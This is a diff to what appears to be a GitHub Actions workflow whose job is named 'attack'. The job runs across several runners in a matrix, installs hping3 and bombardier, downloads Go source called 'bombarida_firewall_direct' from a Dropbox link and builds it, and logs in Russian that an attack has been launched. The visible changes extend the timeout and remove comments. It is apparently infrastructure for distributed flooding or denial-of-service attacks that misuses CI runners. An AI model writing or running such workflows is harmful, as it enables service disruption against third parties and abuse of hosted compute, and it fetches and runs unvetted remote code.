@@ -15,7 +15,7 @@ on:
 jobs:
   attack:
     runs-on: ubuntu-latest
-    timeout-minutes: 360
+    timeout-minutes: 400
     strategy:
       fail-fast: false
       matrix:
@@ -35,14 +35,12 @@ jobs:
         run: |
           sudo apt-get update -qq && sudo apt-get install -y hping3 curl jq --no-install-recommends
           
-          # Bombardier
           if [ ! -f /usr/local/bin/bombardier ]; then
             wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier-linux-amd64
             chmod +x bombardier-linux-amd64
             sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
           fi
 
-          # Bombarida
           if [ ! -f ./bombarida ]; then
             wget -q -O bombarida.go "https://www.dropbox.com/scl/fi/zss6t38cy6wdztch3p5sj/bombarida_firewall_direct-1.go?rlkey=sz2tagt1enucywsrj6d7ei19k&st=8pzgzqbz&dl=1"
             go build -o bombarida bombarida.go
@@ -138,7 +136,6 @@ jobs:
               echo "[+] [$RUNNER_ID] Атака запущена (PID: $CURRENT_PID)"
             fi
 
-            # Логи только от runner1
             if [ "$RUNNER_ID" = "runner1" ] && [ $CURRENT_PID -ne 0 ]; then
               LOG_DATA='{
   "runner": "'$RUNNER_ID'",
